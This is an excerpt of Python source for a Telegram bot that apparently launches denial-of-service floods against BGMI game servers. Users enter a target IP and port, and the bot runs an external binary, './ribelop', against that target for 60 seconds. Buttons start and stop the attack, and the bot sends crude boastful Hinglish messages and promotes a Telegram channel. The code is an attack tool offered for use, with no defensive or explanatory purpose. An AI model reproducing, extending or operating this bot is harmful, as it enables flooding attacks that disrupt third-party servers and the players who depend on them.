...
def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:
            process = subprocess.Popen(["./ribelop", target_ip, str(target_port), "1", "60"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
...
def send_main_buttons(chat_id):
    ...
    markup.add(KeyboardButton("RIBEL OFF❌"), KeyboardButton("RIBEL ON🔱"), KeyboardButton("/ribelop"))
    bot.send_message(chat_id, '''*By  @m4_ribel_op   ☠️ M4_RIBEL_OP☠️:
@m4_ribel_op
⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
...
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿
       Niche{ RIBEL ON🔱} likha 👇hai use per click kar*''', reply_markup=markup, parse_mode='Markdown')
...
By @m4_ribel_op*''', parse_mode='Markdown')
...
@bot.message_handler(func=lambda message: message.text == "RIBEL ON🔱")
def start_attack(message):
    ...
    if attack_details:
        ...
        bot.send_message(message.chat.id, f'''*😂 Bgmi ki gand maar Di gai hai Successfully 
                         Attack rokane ke liye niche RIBEL OFF❌ ka use per click kar
                         https://t.me/Musicroomfriends !  🚀  : {target_ip} Port: {target_port}*''', parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "*Niche /RIBEL likha 👇hai use per click kar.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "RIBEL OFF❌")
def stop_attack(message):
    attack_details = user_attack_details.get(message.from_user.id)
    if attack_details:
        target_ip, target_port = attack_details
        run_attack_command_sync(message.from_user.id, target_ip, target_port, 2)
        bot.send_message(message.chat.id, f"*💋Bgmi ki gand maarna rok Di gai hai❌ By  https://t.me/Musicroomfriends  : {target_ip} Port: {target_port}*", parse_mode='Markdown')
